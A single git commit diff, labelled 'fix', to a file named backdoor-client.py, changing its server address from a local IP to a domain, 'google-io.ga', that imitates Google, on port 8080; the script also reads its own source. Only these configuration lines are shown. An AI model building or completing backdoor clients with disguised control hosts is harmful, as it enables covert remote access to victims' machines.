98233cf6cfcba8c14cba23f88a662cde58a38c6d
Lucas Marandat <lucas.mrdt@gmail.com>
2019-10-15 14:16:56 +0200

    fix

--- src/backdoor-client.py
+++ src/backdoor-client.py
@@ -13,8 +13,7 @@ import threading
 USER = os.environ.get('USER', 'unknown')
 BUFFER_SIZE = 1025
 PORT = 8080
-# DNS = 'google-io.ga'
-DNS = '172.20.10.2'
+DNS = 'google-io.ga'
 
 SCRIPT_PATH = os.path.realpath(__file__)
 SCRIPT_CONTENT = (open(SCRIPT_PATH, 'r')).read()
